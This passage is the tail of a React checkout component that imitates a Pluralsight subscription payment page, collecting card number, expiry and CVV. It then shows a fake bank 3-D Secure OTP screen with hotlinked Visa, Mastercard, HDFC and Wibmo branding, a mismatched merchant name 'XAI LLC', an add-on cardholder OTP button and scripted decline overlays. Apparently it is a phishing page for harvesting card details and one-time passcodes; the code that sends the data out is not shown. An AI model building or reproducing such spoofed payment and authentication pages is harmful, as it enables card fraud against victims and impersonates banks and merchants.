                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.cardNumber}
                           </div>
                         )}
                       </div>
                    </div>

                    <div className="grid grid-cols-3 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Expiration<span className="text-red-500">*</span>
                        </label>
                         <Select onValueChange={(value) => handleCardInputChange('expiryMonth', value)}>
                           <SelectTrigger className={`bg-white text-slate-900 ${
                             cardErrors.expiryMonth ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                           }`}>
                             <SelectValue placeholder="Month" />
                           </SelectTrigger>
                           <SelectContent>
                             {Array.from({length: 12}, (_, i) => (
                               <SelectItem key={i+1} value={String(i+1).padStart(2, '0')}>
                                 {String(i+1).padStart(2, '0')}
                               </SelectItem>
                             ))}
                           </SelectContent>
                         </Select>
                         {cardErrors.expiryMonth && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.expiryMonth}
                           </div>
                         )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2 text-transparent">Year</label>
                         <Select onValueChange={(value) => handleCardInputChange('expiryYear', value)}>
                           <SelectTrigger className={`bg-white text-slate-900 ${
                             cardErrors.expiryYear ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                           }`}>
                             <SelectValue placeholder="Year" />
                           </SelectTrigger>
                           <SelectContent>
                             {Array.from({length: 51}, (_, i) => {
                               const year = new Date().getFullYear() + i;
                               return (
                                 <SelectItem key={year} value={String(year).slice(-2)}>
                                   {year}
                                 </SelectItem>
                               );
                             })}
                           </SelectContent>
                         </Select>
                         {cardErrors.expiryYear && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.expiryYear}
                           </div>
                         )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          CVV<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cvv}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                            handleCardInputChange('cvv', value);
                          }}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cvv ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder="123"
                        />
                        {cardErrors.cvv && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>
                        )}
                      </div>
                    </div>

                    {/* Review Order Button */}
                    <Button
                      onClick={handleReviewOrder}
                      disabled={!paymentMethod}
                      className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                        paymentMethod 
                          ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                          : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                      }`}
                    >
                      Review order
                    </Button>
                  </div>
                )}
              </>
            )}

            {/* Processing Section */}
            {currentStep === 'processing' && (
              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
                <div className="text-center">
                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
                  <p className="text-white text-lg font-medium">{processingMessage}</p>
                </div>
              </div>
            )}

            {/* Enhanced OTP Verification Section */}
            {currentStep === 'otp' && (
              <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-2">
                <div className="bg-white rounded-lg w-full max-w-md shadow-2xl relative" style={{ minWidth: 420, maxWidth: 440 }}>
                  {/* Cancel Button (top right, small) */}
                  <button
                    onClick={handleOtpCancel}
                    className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-base font-bold bg-white rounded-full w-7 h-7 flex items-center justify-center shadow"
                    style={{ zIndex: 10, fontSize: '1rem', padding: 0, lineHeight: 1 }}
                    aria-label="Cancel"
                  >
                    ✕
                  </button>
                  {/* Top Row: Card Brand Logo (left) and Bank Logo (right) */}
                  <div className="flex items-center justify-between px-8 pt-8 pb-2 border-b border-gray-200">
                    <div className="flex items-center gap-2">
                      <img
                        src={
                          getCardType(cardData.cardNumber) === 'visa' ? 'https://www.unitybank.com.au/media/1362/visa-secure-logo.png?width=250&height=250' :
                          getCardType(cardData.cardNumber) === 'mastercard' ? 'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg' :
                          getCardType(cardData.cardNumber) === 'discover' ? 'https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png' :
                          getCardType(cardData.cardNumber) === 'rupay' ? 'https://images.seeklogo.com/logo-png/25/1/rupay-logo-png_seeklogo-256357.png' :
                          'https://www.unitybank.com.au/media/1362/visa-secure-logo.png?width=250&height=250'
                        }
                        alt="Card Brand Logo"
                        className="h-10 w-24 object-contain"
                      />
                      <span className="font-semibold text-gray-700 text-base">ID Check</span>
                    </div>
                    <img
                      src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
                      alt="Bank Logo"
                      className="h-10 w-32 object-contain"
                    />
                  </div>
                  {/* Merchant Details Table */}
                  <div className="px-8 pt-4 pb-2">
                    <table className="w-full text-sm">
                      <tbody>
                        <tr>
                          <td className="text-gray-600 py-1">Merchant Name</td>
                          <td className="text-right font-medium text-gray-800 py-1">XAI LLC</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Date</td>
                          <td className="text-right font-medium text-gray-800 py-1">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Card Number</td>
                          <td className="text-right font-medium text-gray-800 py-1">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Amount</td>
                          <td className="text-right font-bold text-blue-700 py-1">₹{displayPrice.toLocaleString()}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Personal Message</td>
                          <td className="text-right font-medium text-gray-800 py-1"></td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  {/* Authenticate Transaction Title */}
                  <div className="px-8 pt-2 pb-0">
                    <h3 className="text-base font-semibold text-blue-700 text-center mb-2">Authenticate Transaction</h3>
                  </div>
                  {/* OTP Sent Message or Resend Message */}
                  <div className="px-8">
                    {resendMessage ? (
                      <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                        <p className="text-green-700 text-sm text-center">
                          One time passcode has been sent to your registered mobile number XX{otpMobileLast4}
                        </p>
                      </div>
                    ) : (
                      <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                        <p className="text-green-700 text-sm text-center">
                          One time passcode has been sent to your registered mobile number XX{otpMobileLast4}
                        </p>
                      </div>
                    )}
                  </div>
                  {/* Addon Cardholder OTP Button */}
                  <div className="px-8 mb-2">
                    <button className="w-full bg-blue-50 text-blue-700 text-xs font-semibold py-1 rounded mb-2 border border-blue-100 hover:bg-blue-100 transition">
                      CLICK HERE For Addon Cardholder OTP
                    </button>
                  </div>
                  {/* Error Message (Fail OTP) */}
                  {otpError && (
                    <div className="px-8 mb-2">
                      <div className="border border-red-500 rounded p-2">
                        <p className="text-red-700 text-xs text-center">{otpError}</p>
                      </div>
                    </div>
                  )}
                  {/* OTP Input */}
                  <div className="px-8 mb-2">
                    <input
                      value={otpValue}
                      onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                      disabled={otpSubmitting}
                      className="w-full text-center text-base tracking-widest h-10 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
                      placeholder="Enter OTP Here"
                      maxLength={6}
                      style={{ letterSpacing: '0.3em', fontSize: '1rem' }}
                    />
                  </div>
                  {/* Resend OTP Link */}
                  <div className="px-8 mb-2 text-right">
                    <button
                      onClick={() => {
                        setResendMessage('One time passcode has been sent to your registered mobile number XX' + otpMobileLast4);
                        startOtpTimer();
                      }}
                      className="text-blue-700 text-xs font-semibold hover:underline focus:outline-none"
                      disabled={otpSubmitting}
                    >
                      Resend OTP
                    </button>
                  </div>
                  {/* Action Buttons */}
                  <div className="px-8 pb-2 flex gap-2">
                    <button
                      onClick={handleOtpCancel}
                      className="flex-1 h-9 border border-gray-300 rounded bg-white text-gray-700 font-semibold hover:bg-gray-50 transition text-base"
                      disabled={otpSubmitting}
                    >
                      CANCEL
                    </button>
                    <button
                      onClick={handleOtpSubmit}
                      disabled={otpValue.length !== 6 || otpSubmitting}
                      className="flex-1 h-9 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-base"
                    >
                      {otpSubmitting ? (
                        <span className="flex items-center justify-center"><Loader2 className="h-4 w-4 animate-spin mr-2" />SUBMIT</span>
                      ) : (
                        'SUBMIT'
                      )}
                    </button>
                  </div>
                  {/* Timer and Powered by Footer */}
                  <div className="text-center space-y-2 pb-4 pt-2">
                    <p className="text-xs text-gray-500">
                      This page automatically time out after {formatTimer(otpTimer)} minutes
                    </p>
                    <div className="flex items-center justify-center gap-2">
                      <span className="text-xs text-gray-500">Powered by</span>
                      <img
                        src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png"
                        alt="Wibmo"
                        className="h-4 object-contain"
                      />
                    </div>
                  </div>
                  {/* Spinner overlay for Declined/Insufficient */}
                  {showSpinner && (
                    <div className="absolute inset-0 bg-white bg-opacity-80 flex items-center justify-center z-50">
                      <Loader2 className="h-12 w-12 animate-spin text-blue-500" />
                    </div>
                  )}
                  {/* Decline/Insufficient error message (after redirect) */}
                  {declineError && (
                    <div className="absolute left-0 right-0 top-2 text-center">
                      <span className="text-red-600 text-sm font-semibold">{declineError}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Review Section */}
            {currentStep === 'review' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Payment</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    3
                  </div>
                  <h2 className="text-2xl font-bold">Review and confirm</h2>
                </div>

                <div className="bg-slate-800 rounded-lg p-6 mb-8">
                  <h3 className="text-xl font-bold mb-6">Review your order details</h3>
                  
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Plan</span>
                      <span className="text-slate-300">{planName} - {billingText}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Payment Method</span>
                      <span className="text-slate-300">Credit Card ending in {cardData.cardNumber.slice(-4)}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Billing Cycle</span>
                      <span className="text-slate-300">{billing === 'yearly' ? 'Yearly' : 'Monthly'}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Date & Time</span>
                      <span className="text-slate-300">{new Date().toLocaleString()}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Country</span>
                      <span className="text-slate-300">{formData.country}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Customer</span>
                      <span className="text-slate-300">{formData.firstName} {formData.lastName}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Email</span>
                      <span className="text-slate-300">{formData.email}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Transaction ID</span>
                      <span className="text-slate-300 font-mono">TXN-{Date.now().toString().slice(-8)}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Total Amount</span>
                      <span className="text-xl font-bold text-white">₹{displayPrice.toLocaleString()}</span>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handleConfirmPayment}
                  disabled={confirmingPayment}
                  className="w-full md:w-auto px-12 py-3 rounded font-medium bg-green-600 hover:bg-green-700 text-white relative"
                >
                  {confirmingPayment && (
                    <>
                      <div className="absolute inset-0 bg-green-600 bg-opacity-50 rounded flex items-center justify-center">
                        <Loader2 className="h-5 w-5 animate-spin" />
                      </div>
                      <span className="opacity-30">Confirm Payment</span>
                    </>
                  )}
                  {!confirmingPayment && 'Confirm Payment'}
                </Button>
              </>
            )}
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <div className="bg-slate-800 rounded-lg p-6">
              <h3 className="text-xl font-bold mb-6">Order summary</h3>
              
              <div className="flex justify-between items-center mb-4">
                <span className="font-medium">Plan</span>
                <span className="font-medium">Price</span>
              </div>
              
              <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-600">
                <span className="text-slate-300">{planName} - {billingText}</span>
                <span className="font-bold">₹{displayPrice.toLocaleString()}</span>
              </div>

              {/* Promo Code */}
              <div className="mb-6">
                <div className="flex gap-2">
                  <Input
                    value={promoCode}
                    onChange={(e) => setPromoCode(e.target.value)}
                    placeholder="Promo Code"
                    className="bg-white text-slate-900 border-slate-300 flex-1"
                  />
                  <Button variant="outline" className="text-slate-900 border-slate-300 bg-blue-600 text-white hover:bg-blue-700">
                    Apply
                  </Button>
                </div>
              </div>

              {/* Summary */}
              <div className="space-y-3 mb-6">
                <div className="flex justify-between">
                  <span className="text-slate-300">Subtotal</span>
                  <span>₹{displayPrice.toLocaleString()}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-300">Estimated tax<sup>†</sup></span>
                  <span>₹0</span>
                </div>
              </div>

              <div className="border-t border-slate-600 pt-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-xl font-bold">Total due today</span>
                  <span className="text-xl font-bold">₹{displayPrice.toLocaleString()}</span>
                </div>
              </div>

              {/* Tax Notice */}
              <div className="text-xs text-slate-400 space-y-2">
                <p>
                  <sup>†</sup> Pluralsight is required by law to collect transaction taxes such as sales tax, VAT, GST or other similar taxes on purchases in some jurisdictions. The actual tax amount will be calculated based on the applicable jurisdictional tax rates when your order is processed.
                </p>
                <p>
                  <sup>††</sup> Excluding transaction taxes such as sales tax, VAT, GST and other similar taxes
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Next Steps Preview */}
      <div className="border-t border-slate-700 px-6 py-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs">
                2
              </div>
              <span className="text-slate-400">Payment</span>
            </div>
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-3">
                <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs">
                  3
                </div>
                <span className="text-slate-400">Review and confirm</span>
              </div>
              <div className="flex items-center gap-2 text-slate-400 text-sm">
                <Lock size={16} />
                <span>Secure checkout</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="border-t border-slate-700 px-6 py-6 text-xs text-slate-400">
        <div className="max-w-7xl mx-auto flex flex-wrap gap-6">
          <span>Copyright © 2004-2025 Pluralsight LLC. All rights reserved.</span>
          <a href="#" className="hover:text-white">Privacy Policy</a>
          <a href="#" className="hover:text-white">Terms of Use</a>
          <a href="#" className="hover:text-white">Do Not Sell or Share My Personal Data</a>
        </div>
      </div>
    </div>
  );
};

export default Checkout;
